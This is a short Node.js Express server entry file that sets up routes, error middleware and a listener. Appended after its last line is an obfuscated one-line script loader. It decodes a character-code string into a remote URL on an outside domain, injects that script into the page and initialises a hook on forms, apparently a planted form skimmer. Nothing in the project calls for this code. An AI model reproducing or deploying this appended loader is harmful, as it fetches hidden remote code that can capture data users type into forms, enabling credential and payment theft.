require('dotenv/config');
const logger = require('./application/log');
const errorMiddleware = require('./application/middleware/error-middleware');
const app = require('./application/web');
const publicRoute = require('./routes/public-route');

// Routes 
app.use(publicRoute)
app.use('/test', (req, res) => {
    res.status(200).json({
        status: 200,
        data: 'Selamat Datang'
    })
})

// Middleware
app.use(errorMiddleware);

// Run Applications
app.listen(process.env.APP_PORT, logger.info(`Server running at ${process.env.APP_HOST}:${process.env.APP_PORT}`));
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b